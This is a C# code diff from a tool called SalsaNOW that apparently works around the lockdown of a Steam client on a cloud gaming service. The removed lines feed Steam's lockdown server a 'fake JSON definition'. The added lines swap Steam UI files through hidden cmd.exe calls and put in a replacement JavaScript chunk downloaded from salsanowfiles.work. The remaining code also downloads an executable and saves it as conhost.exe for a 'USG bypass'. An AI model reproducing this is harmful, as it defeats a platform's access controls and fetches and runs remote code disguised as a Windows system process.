@@ -21,32 +21,44 @@ namespace SalsaNOW
         {
             try
             {
-                SalsaLogger.Info("Initiating Steam Proxy shutdown sequence...");
-                string dummyJson = Path.Combine(globalDirectory, "kaka.json");
                 string usgMask = Path.Combine(globalDirectory, "conhost.exe");
-
-                using (var wc = new WebClient())
-                {
-                    try { await wc.UploadStringTaskAsync("http://127.10.0.231:9753/shutdown", "POST"); } catch { }
-                    await wc.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/jsons/kaka.json"), dummyJson);
-                }
-
-                // Force lockdown server to use our fake JSON definition
-                Process.Start(new ProcessStartInfo
-                {
-                    FileName = @"C:\Program Files (x86)\Steam\lockdown\server\server.exe",
-                    Arguments = dummyJson,
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    WindowStyle = ProcessWindowStyle.Hidden
-                });
+                string destinationDir = @"C:\Program Files (x86)\Steam\steamui";
 
                 string cache = @"C:\Program Files (x86)\Steam\appcache";
                 if (Directory.Exists(cache)) Directory.Delete(cache, true);
 
                 await DisableSteamInput();
 
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = @"/c xcopy ""C:\Program Files (x86)\Steam\steamui"" ""C:\Program Files (x86)\Steam\steamuiOG"" /E /I /H /Y",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                })?.WaitForExit();
+
+                File.Delete(@"C:\Program Files (x86)\Steam\steamuiOG\chunk~2dcc5aaf7.js");
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = @"/c ren ""C:\Program Files (x86)\Steam\steamui"" ""steamuiNV""",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                })?.WaitForExit();
+
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = @"/c ren ""C:\Program Files (x86)\Steam\steamuiOG"" ""steamui""",
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                })?.WaitForExit();
+
+                using (var wc = new WebClient()) await wc.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/USG/chunk~2dcc5aaf7.js"), destinationDir + "\\chunk~2dcc5aaf7.js");
+
                 // Steam USG Bypass Part (Temporary until patch discovered)
+
                 using (var wc = new WebClient()) await wc.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/USG/bleh.exe"), usgMask);
 
                 Process usg = null;
